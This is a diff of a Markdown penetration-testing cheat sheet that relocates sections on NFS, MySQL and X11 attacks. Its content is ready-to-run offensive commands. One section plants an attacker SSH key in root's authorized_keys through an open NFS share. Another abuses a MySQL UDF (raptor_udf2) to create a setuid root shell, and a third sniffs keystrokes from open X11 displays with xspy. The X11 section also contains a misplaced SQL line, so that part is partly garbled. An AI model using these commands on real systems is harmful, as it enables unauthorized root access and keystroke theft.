@@ -61,43 +61,7 @@
 |netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1 connectport=9001 connectaddress=x.x.x.100 |
 
 
-### Insecure NFS Share Vulnerabilities
 
-| for Example |
-| ------------- |
-| showmount -e 192.168.100.25 #Check if any share is available |
-| mount -t nfs 192.168.100.25:/home /tmp/NFS |
-| mount -t nfs 192.168.1.112:/ /mnt -o nolock |
-| mkdir -p /root/.ssh # We May Upload SSH Key to NFS |
-| ssh-keygen -t rsa -b 4096 |
-| cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/ |
-| cat authorized_keys |
-| cat id_rsa.pub >> authorized_keys |
-|ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|
-
-
-### MySQL Privilge Escalation Through UDF
-
-| for Example|
-| ------------- |
-|gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
-| use mysql; |
-|create table npn(line blob); |
-| insert into npn values(load_file('/tmp/raptor_udf2.so')); |
-|select * from npn into dumpfile '/usr/lib/raptor_udf2.so';|
-| create function do_system returns integer soname 'raptor_udf2.so'; |
-| select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
-
-
-### X 11  Commond Vulnerability
-
-| for Example  |
-| ------------- |
-| use auxiliary/scanner/x11/open_x11 |
-| nmap -p 6000 --script=x11-access 192.168.2.26,75 |
-|create table npn(line blob); |
-| xdpyinfo -display 192.168.2.75:0 | head -n 5 |
-|xspy -display 192.168.1.23:0 -delay 100|
 
 | Linxu and Microsoft RPC Enumeration  |
 | ------------- |
@@ -173,3 +137,43 @@
 | ------------- |
 | smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
 | smbclient -N -L \\\\10.10.10.103 |
+
+
+
+### Insecure NFS Share Vulnerabilities
+
+| for Example |
+| ------------- |
+| showmount -e 192.168.100.25 #Check if any share is available |
+| mount -t nfs 192.168.100.25:/home /tmp/NFS |
+| mount -t nfs 192.168.1.112:/ /mnt -o nolock |
+| mkdir -p /root/.ssh # We May Upload SSH Key to NFS |
+| ssh-keygen -t rsa -b 4096 |
+| cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/ |
+| cat authorized_keys |
+| cat id_rsa.pub >> authorized_keys |
+|ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|
+
+
+### MySQL Privilge Escalation Through UDF
+
+| for Example|
+| ------------- |
+|gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
+| use mysql; |
+|create table npn(line blob); |
+| insert into npn values(load_file('/tmp/raptor_udf2.so')); |
+|select * from npn into dumpfile '/usr/lib/raptor_udf2.so';|
+| create function do_system returns integer soname 'raptor_udf2.so'; |
+| select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
+
+
+### X 11  Commond Vulnerability
+
+| for Example  |
+| ------------- |
+| use auxiliary/scanner/x11/open_x11 |
+| nmap -p 6000 --script=x11-access 192.168.2.26,75 |
+| create table npn(line blob); |
+| xdpyinfo -display 192.168.2.75:0 | head -n 5 |
+| xspy -display 192.168.1.23:0 -delay 100 |
